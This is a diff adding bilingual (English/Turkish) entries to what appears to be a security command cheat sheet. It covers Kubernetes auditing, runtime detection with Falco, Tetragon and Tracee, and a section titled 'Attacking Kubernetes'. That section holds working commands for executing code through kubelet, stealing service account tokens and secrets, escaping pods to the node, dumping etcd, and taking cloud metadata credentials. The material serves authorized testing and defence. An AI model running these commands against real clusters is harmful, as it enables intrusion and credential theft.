+            "desc": "Find containers allowed to run as root",
+            "desc_tr": "Root olarak calismasina izin verilen konteynerleri bul",
+            "cmd": "kubeaudit nonroot --kubeconfig <FILE>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "kubeaudit Autofix Manifest",
+            "desc": "Automatically patch a manifest to fix audit findings",
+            "desc_tr": "Denetim bulgularini gidermek icin manifesti otomatik yamala",
+            "cmd": "kubeaudit autofix -f <FILE> -o <FILE>.fixed.yaml",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "Review the autofixed output before applying; it injects securityContext and other hardening defaults."
+          },
+          {
+            "title": "kubeaudit JSON / Custom Severity",
+            "desc": "Emit JSON and raise minimum reported severity to error",
+            "desc_tr": "JSON uret ve minimum raporlanan onem seviyesini error'a yukselt",
+            "cmd": "kubeaudit all --format json --minseverity error",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Polaris CLI Audit Live Cluster",
+            "desc": "Audit the running cluster and print a Polaris report",
+            "desc_tr": "Calisan kumeyi denetle ve Polaris raporu yazdir",
+            "cmd": "polaris audit --format pretty",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Polaris Audit Local Manifests",
+            "desc": "Audit a directory of YAML manifests with Polaris",
+            "desc_tr": "Bir dizindeki YAML manifestlerini Polaris ile denetle",
+            "cmd": "polaris audit --audit-path <PATH> --format json > polaris-report.json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Polaris Audit with Score Gate (CI)",
+            "desc": "Fail CI when the cluster score drops below a threshold",
+            "desc_tr": "Kume skoru esigin altina dustugunde CI'yi basarisiz yap",
+            "cmd": "polaris audit --set-exit-code-below-score 90 --format score",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Polaris Fail on Danger Severity",
+            "desc": "Exit non-zero when any danger-level check fails",
+            "desc_tr": "Herhangi bir danger seviyesi kontrol basarisiz olunca sifirdan farkli cik",
+            "cmd": "polaris audit --set-exit-code-on-danger --only-show-failed-tests",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Polaris Dashboard (local)",
+            "desc": "Serve the Polaris web dashboard against the current cluster",
+            "desc_tr": "Polaris web panosunu mevcut kumeye karsi yayinla",
+            "cmd": "polaris dashboard --port 8080",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Polaris Custom Config Audit",
+            "desc": "Run Polaris with a custom checks configuration file",
+            "desc_tr": "Polaris'i ozel kontrol yapilandirma dosyasi ile calistir",
+            "cmd": "polaris audit --config <FILE> --format pretty",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "kubescape NSA/CIS Framework Scan",
+            "desc": "Run kubescape against NSA and CIS hardening frameworks",
+            "desc_tr": "kubescape'i NSA ve CIS sertlestirme cerceveleriyle calistir",
+            "cmd": "kubescape scan framework nsa,cis-v1.10.0 --format json --output results.json",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          }
+        ]
+      },
+      {
+        "name": "Runtime Security (Falco, Tetragon, Tracee)",
+        "commands": [
+          {
+            "title": "Install Falco via Helm",
+            "desc": "Deploy Falco runtime security on Kubernetes via Helm",
+            "desc_tr": "Falco calisma zamani guvenligini Helm ile Kubernetes uzerine kur",
+            "cmds": [
+              "helm repo add falcosecurity https://falcosecurity.github.io/charts",
+              "helm repo update",
+              "helm install falco falcosecurity/falco --namespace falco --create-namespace"
+            ],
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Install Falco with modern eBPF",
+            "desc": "Install Falco using the CO-RE modern eBPF probe (no kernel headers needed)",
+            "desc_tr": "Falco'yu CO-RE modern eBPF probe ile kur (kernel header gerektirmez)",
+            "cmd": "helm install falco falcosecurity/falco --namespace falco --create-namespace --set driver.kind=modern_ebpf",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Run Falco Standalone",
+            "desc": "Start Falco with main config and rule files on a host",
+            "desc_tr": "Falco'yu ana yapilandirma ve kural dosyalari ile bir hostta baslat",
+            "cmd": "falco -c /etc/falco/falco.yaml -r /etc/falco/falco_rules.yaml -r /etc/falco/falco_rules.local.yaml",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Validate Falco Rules",
+            "desc": "Dry-run validate a Falco rules file for syntax errors",
+            "desc_tr": "Bir Falco kural dosyasini sozdizimi hatalari icin dogrula (dry-run)",
+            "cmd": "falco -r <FILE> --validate <FILE>",
+            "tags": [
+              "tool"
+            ],
+            "note": "Use this in CI before deploying custom rules to catch broken macros/lists early."
+          },
+          {
+            "title": "Falco JSON Output to Stdout",
+            "desc": "Emit Falco alerts as structured JSON for log shippers",
+            "desc_tr": "Falco uyarilarini log toplayicilar icin yapilandirilmis JSON olarak uret",
+            "cmd": "falco -o json_output=true -o stdout_output.enabled=true",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Tail Falco Alerts in Kubernetes",
+            "desc": "Stream live Falco security alerts from the DaemonSet pods",
+            "desc_tr": "DaemonSet pod'larindan canli Falco guvenlik uyarilarini akit",
+            "cmd": "kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco -f",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "List Loaded Falco Rules",
+            "desc": "List all rules, macros and fields available in loaded rulesets",
+            "desc_tr": "Yuklu kural setlerindeki tum kurallari, makrolari ve alanlari listele",
+            "cmd": "falco --list -r /etc/falco/falco_rules.yaml",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Deploy Falcosidekick for Alert Routing",
+            "desc": "Enable Falcosidekick to forward Falco events to Slack, SIEM, etc.",
+            "desc_tr": "Falco olaylarini Slack, SIEM vb. yonlendirmek icin Falcosidekick'i etkinlestir",
+            "cmd": "helm install falco falcosecurity/falco --namespace falco --create-namespace --set falcosidekick.enabled=true --set falcosidekick.webui.enabled=true",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Falco Custom Rule: Shell in Container",
+            "desc": "Add a custom local rule alerting on interactive shells inside containers",
+            "desc_tr": "Konteyner icindeki etkilesimli shell'leri uyaran ozel yerel kural ekle",
+            "cmd": "cat <<'EOF' > /etc/falco/falco_rules.local.yaml\n- rule: Terminal shell in container\n  desc: A shell was spawned in a container\n  condition: spawned_process and container and shell_procs and proc.tty != 0\n  output: \"Shell in container (user=%user.name container=%container.name cmd=%proc.cmdline)\"\n  priority: WARNING\nEOF",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Install Tetragon via Helm",
+            "desc": "Deploy Cilium Tetragon eBPF runtime security on Kubernetes",
+            "desc_tr": "Cilium Tetragon eBPF calisma zamani guvenligini Kubernetes'e kur",
+            "cmds": [
+              "helm repo add cilium https://helm.cilium.io",
+              "helm repo update",
+              "helm install tetragon cilium/tetragon --namespace kube-system"
+            ],
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Stream Tetragon Events (raw JSON)",
+            "desc": "Tail the raw JSON event export stream from Tetragon agents",
+            "desc_tr": "Tetragon ajanlarindan ham JSON olay akisini izle",
+            "cmd": "kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f",
+            "tags": [
+              "essential",
+              "tool"
+            ]
+          },
+          {
+            "title": "Pretty-Print Tetragon Events",
+            "desc": "Use the tetra CLI to view human-readable compact runtime events",
+            "desc_tr": "tetra CLI ile okunabilir kompakt calisma zamani olaylarini goruntule",
+            "cmd": "kubectl exec -ti -n kube-system ds/tetragon -c tetragon -- tetra getevents -o compact",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Filter Tetragon Events by Pod",
+            "desc": "Stream Tetragon events scoped to a single pod and namespace",
+            "desc_tr": "Tetragon olaylarini tek bir pod ve namespace ile sinirlandirarak akit",
+            "cmd": "kubectl exec -ti -n kube-system ds/tetragon -c tetragon -- tetra getevents -o compact --pod <POD> --namespace <NAMESPACE>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Apply Tetragon TracingPolicy",
+            "desc": "Load a TracingPolicy CRD to hook specific syscalls/kprobes",
+            "desc_tr": "Belirli syscall/kprobe'lari kancalamak icin bir TracingPolicy CRD yukle",
+            "cmd": "kubectl apply -f <FILE>",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Tetragon File Monitoring Policy",
+            "desc": "Deploy a TracingPolicy that monitors access to sensitive files under /etc",
+            "desc_tr": "/etc altindaki hassas dosyalara erisimi izleyen bir TracingPolicy uygula",
+            "cmd": "cat <<'EOF' | kubectl apply -f -\napiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\nmetadata:\n  name: file-monitoring\nspec:\n  kprobes:\n  - call: security_file_permission\n    syscall: false\n    args:\n    - index: 0\n      type: file\n    selectors:\n    - matchArgs:\n      - index: 0\n        operator: Prefix\n        values: [\"/etc/\"]\nEOF",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "List Tetragon TracingPolicies",
+            "desc": "List all active Tetragon TracingPolicy resources cluster-wide",
+            "desc_tr": "Kume genelindeki tum aktif Tetragon TracingPolicy kaynaklarini listele",
+            "cmd": "kubectl get tracingpolicies.cilium.io -A",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Run Tetragon as Standalone Container",
+            "desc": "Run Tetragon directly with Docker for host-level eBPF observability",
+            "desc_tr": "Host seviyesi eBPF gozlemlenebilirligi icin Tetragon'u Docker ile dogrudan calistir",
+            "cmd": "docker run --name tetragon --rm -d --pid=host --cgroupns=host --privileged -v /sys/kernel:/sys/kernel quay.io/cilium/tetragon:latest",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Install Tracee via Helm",
+            "desc": "Deploy Aqua Tracee eBPF runtime threat detection on Kubernetes",
+            "desc_tr": "Aqua Tracee eBPF calisma zamani tehdit tespitini Kubernetes'e kur",
+            "cmds": [
+              "helm repo add aqua https://aquasecurity.github.io/helm-charts/",
+              "helm repo update",
+              "helm install tracee aqua/tracee --namespace tracee --create-namespace"
+            ],
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Run Tracee Standalone (Docker)",
+            "desc": "Run Tracee in Docker to detect runtime threats via eBPF signatures",
+            "desc_tr": "Calisma zamani tehditlerini eBPF imzalariyla tespit etmek icin Tracee'yi Docker'da calistir",
+            "cmd": "docker run --name tracee -it --rm --pid=host --cgroupns=host --privileged -v /etc/os-release:/etc/os-release-host:ro -v /var/run:/var/run:ro aquasec/tracee:latest",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Trace Specific Tracee Events",
+            "desc": "Capture selected security-relevant events and emit JSON",
+            "desc_tr": "Secili guvenlik ile ilgili olaylari yakala ve JSON olarak uret",
+            "cmd": "tracee --events execve,security_file_open,ptrace --output json",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Tracee: Filter Events by Container",
+            "desc": "Limit Tracee tracing to containerized processes only",
+            "desc_tr": "Tracee izlemeyi yalnizca konteynerlestirilmis sureclere sinirla",
+            "cmd": "tracee --scope container --events execve --output format:json",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Tracee: Run Built-in Detection Signatures",
+            "desc": "Enable behavioral threat-detection signatures for evasion techniques",
+            "desc_tr": "Kacinma tekniklerine yonelik davranissal tehdit tespit imzalarini etkinlestir",
+            "cmd": "tracee --events anti_debugging,dynamic_code_loading,fileless_execution --output json",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "Tracee: Capture Artifacts of an Event",
+            "desc": "Capture written file artifacts to disk for forensic analysis",
+            "desc_tr": "Adli analiz icin yazilan dosya artifaktlarini diske yakala",
+            "cmd": "tracee --events magic_write --capture write --capture dir:/tmp/tracee-out",
+            "tags": [
+              "advanced",
+              "tool"
+            ]
+          },
+          {
+            "title": "List Available Tracee Events",
+            "desc": "Enumerate all events and signatures supported by the Tracee build",
+            "desc_tr": "Tracee surumunun destekledigi tum olaylari ve imzalari listele",
+            "cmd": "tracee list",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Tail Tracee Detections in Kubernetes",
+            "desc": "Stream and filter Tracee threat detections from the DaemonSet",
+            "desc_tr": "DaemonSet'ten Tracee tehdit tespitlerini akit ve filtrele",
+            "cmd": "kubectl logs -n tracee -l app.kubernetes.io/name=tracee -f | grep -i detection",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Verify eBPF Probe Support on Node",
+            "desc": "Check the node kernel exposes BTF and BPF needed by CO-RE tools",
+            "desc_tr": "Node cekirdeginin CO-RE araclari icin gereken BTF ve BPF'i sundugunu kontrol et",
+            "cmd": "grep -E 'CONFIG_BPF=|CONFIG_BPF_SYSCALL=|CONFIG_DEBUG_INFO_BTF=' /boot/config-$(uname -r)",
+            "tags": [
+              "essential"
+            ],
+            "note": "CONFIG_DEBUG_INFO_BTF=y is required for modern eBPF/CO-RE probes used by Falco, Tetragon and Tracee."
+          },
+          {
+            "title": "Generate Test Event to Validate Runtime Tooling",
+            "desc": "Trigger suspicious activity in a throwaway pod to confirm alerts fire",
+            "desc_tr": "Uyarilarin tetiklendigini dogrulamak icin gecici bir pod'da supheli aktivite uret",
+            "cmd": "kubectl run alpine-test --rm -ti --image=alpine -- sh -c 'cat /etc/shadow; nc -h'",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Reading /etc/shadow and spawning a shell in a container are classic detections; use this to smoke-test Falco/Tetragon/Tracee end-to-end."
+          }
+        ]
+      },
+      {
+        "name": "Attacking Kubernetes (kube-hunter, kubeletctl, token abuse, privesc)",
+        "commands": [
+          {
+            "title": "Kube-Hunter Remote Scan",
+            "desc": "Actively probe a remote Kubernetes node for known attack surfaces",
+            "desc_tr": "Uzak bir Kubernetes düğümünü bilinen saldırı yüzeyleri için aktif olarak tara",
+            "cmd": "kube-hunter --remote <TARGET_IP>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Kube-Hunter CIDR Scan",
+            "desc": "Scan a whole subnet with active (exploiting) tests enabled",
+            "desc_tr": "Aktif (sömürü) testleri açıkken tüm bir alt ağı tara",
+            "cmd": "kube-hunter --cidr <TARGET_IP>/24 --active",
+            "tags": [
+              "tool",
+              "advanced"
+            ],
+            "note": "--active yapilandirmaya gercekten dokunur; sadece izin verilen ortamlarda kullan."
+          },
+          {
+            "title": "Kube-Hunter Pod Scan",
+            "desc": "Run from inside a pod to enumerate cluster from an attacker's foothold",
+            "desc_tr": "Bir pod içinden çalıştırarak saldırganın dayanak noktasından kümeyi keşfet",
+            "cmd": "kube-hunter --pod",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Kube-Hunter JSON Report",
+            "desc": "Output findings as JSON for parsing or reporting",
+            "desc_tr": "Bulguları ayrıştırma veya raporlama için JSON olarak çıkar",
+            "cmd": "kube-hunter --remote <TARGET_IP> --report json --log none",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Kubeletctl Scan for Anonymous Access",
+            "desc": "Find pods/containers that allow command execution via the kubelet API",
+            "desc_tr": "Kubelet API üzerinden komut çalıştırmaya izin veren pod/konteynerleri bul",
+            "cmd": "kubeletctl scan rce --server <TARGET_IP>",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Kubeletctl List Pods via Kubelet",
+            "desc": "Enumerate all pods/containers exposed by an unauthenticated kubelet (port 10250)",
+            "desc_tr": "Kimlik doğrulamasız bir kubelet'in (10250 portu) sunduğu tüm pod/konteynerleri listele",
+            "cmd": "kubeletctl pods --server <TARGET_IP>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Kubeletctl Exec Command in Container",
+            "desc": "Run arbitrary commands in a container through the exposed kubelet API",
+            "desc_tr": "Açık kubelet API üzerinden bir konteynerde keyfi komut çalıştır",
+            "cmd": "kubeletctl exec \"id\" -p <POD> -c <CONTAINER> -n <NAMESPACE> --server <TARGET_IP>",
+            "tags": [
+              "tool",
+              "essential"
+            ]
+          },
+          {
+            "title": "Kubeletctl Dump Service Account Tokens",
+            "desc": "Steal a pod's service account token via the kubelet for token abuse",
+            "desc_tr": "Token suistimali için kubelet aracılığıyla bir podun service account token'ını çal",
+            "cmd": "kubeletctl exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\" -p <POD> -c <CONTAINER> -n <NAMESPACE> --server <TARGET_IP>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Kubeletctl Scan All Token Mounts",
+            "desc": "Harvest every service account token from all reachable containers",
+            "desc_tr": "Erişilebilir tüm konteynerlerden her service account token'ı topla",
+            "cmd": "kubeletctl scan token --server <TARGET_IP>",
+            "tags": [
+              "tool",
+              "advanced"
+            ]
+          },
+          {
+            "title": "Raw Kubelet RunningPods Query",
+            "desc": "List running pods directly from an anonymous-auth kubelet read-only endpoint",
+            "desc_tr": "Anonim kimlik doğrulamalı bir kubelet'ten çalışan podları doğrudan listele",
+            "cmd": "curl -sk https://<TARGET_IP>:10250/pods | jq '.items[].metadata.name'",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Raw Kubelet Run Exec",
+            "desc": "Execute a command through the kubelet /run endpoint without any tooling",
+            "desc_tr": "Hiçbir araç olmadan kubelet /run uç noktası üzerinden komut çalıştır",
+            "cmd": "curl -sk -X POST \"https://<TARGET_IP>:10250/run/<NAMESPACE>/<POD>/<CONTAINER>\" -d \"cmd=id\"",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Service Account Token Abuse from Pod",
+            "desc": "Use the mounted service account token to query the API server from inside a pod",
+            "desc_tr": "Bir pod içinden API sunucusunu sorgulamak için bağlı service account token'ı kullan",
+            "cmds": [
+              "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
+              "CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
+              "NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)",
+              "curl --cacert $CA -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/$NS/pods"
+            ],
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Check Own Permissions with auth can-i",
+            "desc": "Enumerate exactly what a stolen token is authorized to do",
+            "desc_tr": "Çalınan bir token'ın tam olarak neye yetkili olduğunu listele",
+            "cmd": "kubectl auth can-i --list --token=<TOKEN>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Test for Cluster-Admin via Token",
+            "desc": "Quickly determine if a token has cluster-admin equivalent rights",
+            "desc_tr": "Bir token'ın cluster-admin eşdeğeri haklara sahip olup olmadığını hızlıca belirle",
+            "cmd": "kubectl auth can-i '*' '*' --all-namespaces --token=<TOKEN>",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Enumerate RBAC for Risky Permissions",
+            "desc": "Find which subjects are bound to cluster-admin across the cluster",
+            "desc_tr": "Küme genelinde hangi öznelerin cluster-admin'e bağlı olduğunu bul",
+            "cmd": "kubectl get clusterrolebindings,rolebindings -A -o json | jq '.items[] | select(.roleRef.name==\"cluster-admin\")'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "List Secrets to Steal Tokens",
+            "desc": "If the token can read secrets, harvest other service account tokens",
+            "desc_tr": "Token secretleri okuyabiliyorsa, diğer service account token'larını topla",
+            "cmd": "kubectl get secrets -A -o json --token=<TOKEN> | jq -r '.items[] | select(.type==\"kubernetes.io/service-account-token\") | .metadata.name'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Privesc via Pod Creation (Token Mount)",
+            "desc": "Abuse pod-create rights to obtain a more privileged service account token",
+            "desc_tr": "Daha yetkili bir service account token elde etmek için pod-oluşturma haklarını suistimal et",
+            "cmds": [
+              "# If you can create pods, mount a privileged SA token",
+              "kubectl run privesc --image=<IMAGE> --overrides='{\"spec\":{\"serviceAccountName\":\"<NAMESPACE>-sa\"}}' -n <NAMESPACE> --token=<TOKEN>",
+              "kubectl exec -it privesc -n <NAMESPACE> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+            ],
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Privesc to Node Root via hostPath Pod",
+            "desc": "Mount the node root filesystem to break out of the pod onto the host",
+            "desc_tr": "Podtan ana makineye çıkmak için düğümün kök dosya sistemini bağla",
+            "cmds": [
+              "kubectl run hostpath --image=<IMAGE> --overrides='{\"spec\":{\"containers\":[{\"name\":\"c\",\"image\":\"<IMAGE>\",\"command\":[\"sleep\",\"99999\"],\"volumeMounts\":[{\"name\":\"h\",\"mountPath\":\"/host\"}]}],\"volumes\":[{\"name\":\"h\",\"hostPath\":{\"path\":\"/\"}}]}}' --token=<TOKEN>",
+              "kubectl exec -it hostpath -- chroot /host bash"
+            ],
+            "tags": [
+              "advanced",
+              "essential"
+            ]
+          },
+          {
+            "title": "Privileged Pod Node Escape",
+            "desc": "Spawn a privileged hostPID pod and nsenter into the host PID namespace",
+            "desc_tr": "Ayrıcalıklı bir hostPID podu oluştur ve nsenter ile ana makinenin PID ad alanına gir",
+            "cmd": "kubectl run priv --image=<IMAGE> --privileged --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"c\",\"image\":\"<IMAGE>\",\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--uts\",\"--ipc\",\"--net\",\"--pid\",\"--\",\"bash\"],\"securityContext\":{\"privileged\":true}}]}}'",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Etcd Direct Secret Dump",
+            "desc": "Read all Kubernetes secrets straight from etcd, bypassing RBAC",
+            "desc_tr": "RBAC'ı atlayarak tüm Kubernetes secretlerini doğrudan etcd'den oku",
+            "cmd": "ETCDCTL_API=3 etcdctl --endpoints=https://<TARGET_IP>:2379 --cacert=<FILE> --cert=<FILE> --key=<FILE> get /registry/secrets/ --prefix --keys-only",
+            "tags": [
+              "advanced"
+            ],
+            "note": "etcd'ye 2379'dan ag erisimi ve istemci sertifikalari gerekir; cogu kume secretleri sifrelemeden saklar."
+          },
+          {
+            "title": "Anonymous API Server Access Check",
+            "desc": "Test whether the API server allows unauthenticated (anonymous) requests",
+            "desc_tr": "API sunucusunun kimlik doğrulamasız (anonim) isteklere izin verip vermediğini test et",
+            "cmd": "curl -sk https://<TARGET_IP>:6443/api/v1/namespaces/default/pods",
+            "tags": [
+              "essential"
+            ]
+          },
+          {
+            "title": "Dashboard Token Theft",
+            "desc": "Extract and decode the dashboard service account token for escalation",
+            "desc_tr": "Yetki yükseltme için dashboard service account token'ını çıkar ve çöz",
+            "cmd": "kubectl -n kubernetes-dashboard get secret -o json --token=<TOKEN> | jq -r '.items[].data.token | select(.!=null)' | base64 -d",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Read Host Files via Hostpath Pod",
+            "desc": "Read sensitive host files when a pod already mounts the host filesystem",
+            "desc_tr": "Bir pod ana makine dosya sistemini zaten bağlamışsa hassas ana makine dosyalarını oku",
+            "cmd": "kubectl exec -it <POD> -n <NAMESPACE> --token=<TOKEN> -- cat /host/etc/shadow",
+            "tags": [
+              "advanced"
+            ]
+          },
+          {
+            "title": "Cloud Metadata SSRF from Pod",
+            "desc": "Steal cloud node IAM credentials from the metadata endpoint inside a pod",
+            "desc_tr": "Bir pod içinden metadata uç noktasından bulut düğümünün IAM kimlik bilgilerini çal",
+            "cmd": "curl -s -H \"Metadata-Flavor: Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+            "tags": [
+              "advanced",
+              "essential"
+            ],
+            "note": "AWS icin http://169.254.169.254/latest/meta-data/iam/security-credentials/ kullan; IMDSv2 ise once token al."
+          },
+          {
+            "title": "Kube-Hunter via Docker (No Install)",
+            "desc": "Run kube-hunter from its container image without local installation",
+            "desc_tr": "Kube-hunter'ı yerel kurulum olmadan konteyner imajından çalıştır",
+            "cmd": "docker run -it --rm --network host aquasec/kube-hunter --remote <TARGET_IP>",
+            "tags": [
+              "tool"
+            ]
+          },
+          {
+            "title": "Kubeletctl Get Container Logs",
+            "desc": "Pull container logs via the kubelet to find leaked secrets or tokens",
+            "desc_tr": "Sızdırılmış secret veya tokenleri bulmak için kubelet aracılığıyla konteyner loglarını çek",
+            "cmd": "kubeletctl logs <POD> <CONTAINER> -n <NAMESPACE> --server <TARGET_IP>",
+            "tags": [
+              "tool"
+            ]
+          }
+        ]
+      }
+    ]
   }
 ];
